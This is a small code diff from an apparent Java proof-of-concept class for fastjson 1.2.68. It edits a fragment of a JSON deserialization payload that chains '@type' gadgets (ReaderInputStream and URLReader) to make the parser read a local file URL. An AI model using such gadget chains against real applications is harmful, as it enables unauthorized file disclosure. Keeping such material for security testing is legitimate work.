@@ -32,7 +32,7 @@ public class fastjson_1_2_68 {
                 "            \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
                 "            \"reader\": {\n" +
                 "                \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\n" +
-                "                \"url\": \"file://test\"\n" +
+                "                \"url\": \"file://tmp\"\n" +
                 "            },\n" +
                 "            \"charsetName\": \"UTF-8\",\n" +
                 "            \"bufferSize\": 1024\n" +
